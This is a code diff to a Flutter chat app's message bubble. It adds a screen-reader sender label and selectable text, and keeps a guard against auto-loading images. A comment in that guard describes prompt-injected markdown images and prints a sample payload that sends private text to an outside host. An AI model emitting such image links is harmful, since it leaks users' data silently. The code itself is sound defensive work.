@@ -116,32 +116,39 @@ class _MessageBubbleState extends State<MessageBubble> {
           border:
               isUser ? null : Border.all(color: context.appTheme.borderColor),
         ),
-        child: MarkdownBody(
-          data: _processedContent,
-          styleSheet: MarkdownStyleSheet(
-            p: theme.textTheme.bodyMedium?.copyWith(
-              color: isUser
-                  ? theme.colorScheme.onPrimary
-                  : theme.colorScheme.onSurface,
+        // Say who sent it before the text, as a screen reader would hear it.
+        child: Semantics(
+          container: true,
+          label: isUser ? 'You' : 'AI Buddy',
+          child: MarkdownBody(
+            data: _processedContent,
+            // Lets people copy part of a reply.
+            selectable: true,
+            styleSheet: MarkdownStyleSheet(
+              p: theme.textTheme.bodyMedium?.copyWith(
+                color: isUser
+                    ? theme.colorScheme.onPrimary
+                    : theme.colorScheme.onSurface,
+              ),
+              a: theme.textTheme.bodyMedium?.copyWith(
+                color: isUser
+                    ? theme.colorScheme.onPrimary
+                    : theme.colorScheme.primary,
+                decoration: TextDecoration.underline,
+              ),
             ),
-            a: theme.textTheme.bodyMedium?.copyWith(
-              color: isUser
-                  ? theme.colorScheme.onPrimary
-                  : theme.colorScheme.primary,
-              decoration: TextDecoration.underline,
-            ),
+            onTapLink: (text, href, title) {
+              if (href != null) {
+                _launchUrl(href);
+              }
+            },
+            // Never fetch images named in message text. A prompt-injected
+            // `![](https://host/?q=<private text>)` would otherwise send data to
+            // that host without the user doing anything. Show the alt text.
+            imageBuilder: (uri, title, alt) => (alt == null || alt.isEmpty)
+                ? const SizedBox.shrink()
+                : Text(alt, style: theme.textTheme.bodyMedium),
           ),
-          onTapLink: (text, href, title) {
-            if (href != null) {
-              _launchUrl(href);
-            }
-          },
-          // Never fetch images named in message text. A prompt-injected
-          // `![](https://host/?q=<private text>)` would otherwise send data to
-          // that host without the user doing anything. Show the alt text.
-          imageBuilder: (uri, title, alt) => (alt == null || alt.isEmpty)
-              ? const SizedBox.shrink()
-              : Text(alt, style: theme.textTheme.bodyMedium),
         ),
       ),
     );
